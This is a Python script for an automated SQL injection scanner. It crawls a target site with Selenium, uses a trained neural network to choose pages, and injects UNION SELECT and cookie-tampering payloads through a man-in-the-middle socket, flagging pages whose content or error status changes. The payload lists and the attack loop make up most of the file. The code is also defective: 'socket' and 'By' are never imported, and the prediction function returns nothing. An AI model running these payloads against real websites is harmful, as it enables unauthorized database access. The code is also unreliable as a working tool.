import sys
import tensorflow as tf
import tensorflow_hub as hub
import tensorflow_text as text
from selenium import webdriver
import pandas as pd
from sklearn.feature_extraction.text import CountVectorizer
import numpy as np
import joblib

print("TensorFlow version:", tf.__version__)

# load model
model = tf.keras.models.load_model("trainedModel")


driver = webdriver.Firefox()
url = sys.argv[1]
driver.get(url)

def start_script(payload, p_type):
    socket.send_string(p_type)
    if socket.recv_string() == "y":
        print(f"sending payload:{payload} over to script: " + payload)
        socket.send_string(payload)


def stop_script():
    # send mitm the signal so stop modifying packets
    socket.send_string("stop")


def union_attack(page):
    # perform a union attack to determine the number of columns
    source = driver.page_source
    # union attack payloads for different types of databases
    union_select = "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--", "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL, NULL--"
    orcale_union = "' UNION+SELECT 'abc' FROM dual--", "' UNION+SELECT 'abc','def' FROM dual--", "' UNION+SELECT 'abc','def','ghi' FROM dual--", "' UNION+SELECT 'abc','def','ghi','jkl' FROM dual--"
    for payload in union_select:
        start_script(payload, "q")
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        # finding which payload works, it should change the contents of the page and not return an error message
        if source != new_source and status[0] != "4" and status[0] != "5":
            print("this page is vulnerable to SQLi")
            return True
    for payload in orcale_union:
        start_script(payload, "q")
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        if source != new_source and status[0] != "4" and status[0] != "5":
            print("this page is vulnerable to SQLi")
            return True
    return False


def cookie_attack(page):
    source = driver.page_source
    payloads = ["' AND '1'='1", "' AND '1'='2", "'", "''", "'--"]
    for payload in payloads:
        # if it retunrs an error message or - then it should be vulnerable
        start_script(payload, "c")
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        # if modifying the cookie field got an error message or changed the contents of the site it's vulnerable
        if status[0] == "4" or status[0] == "5":
            print(f"this paylaod: {payload} is causing the site to return a status of {status}  indicting an error that indicates it's vulnerable")
            return True
    return False


def test_payloads(site):
    if not cookie_attack(site):
        if not union_attack(site):
            return False
    return True


def predict(data):
    vectorizer = joblib.load("vectorizer.pkl")
    X_new_vec = vectorizer.transform(data["Text"])

    # Reshape the input data
    X_new_vec = np.reshape(X_new_vec.toarray(), (X_new_vec.shape[0], 1, X_new_vec.shape[1]))

    # Make predictions
    predictions = model.predict(X_new_vec)
    predictions = predictions.flatten()  # Assuming binary classification

    # Convert predictions to binary labels (0 or 1)
    binary_predictions = np.where(predictions > 0.5, 1, 0)
    print(binary_predictions)


# this is the version of the script that uses the model to predict if the site is vulnerable
def crawl_site():
    links = []
    already_visited = []
    found_end = False
    while not found_end:
        # go through site testing out different pages
        page_links = driver.find_elements(By.XPATH, "//a[@href]")
        for link in page_links:
            if link.get_attribute("href") not in links and url in link.get_attribute("href") and link.get_attribute("href") not in already_visited:
                links.append(link.get_attribute("href"))
        next_page = links.pop()
        driver.get(next_page)
        already_visited.append(next_page)
        source = driver.page_source
        df = pd.DataFrame({'Text': [source]})
        if predict(df):
            if test_payloads(next_page):
                print("page is vulnerable!")
                return True


if __name__ == '__main__':
    crawl_site()
        
        
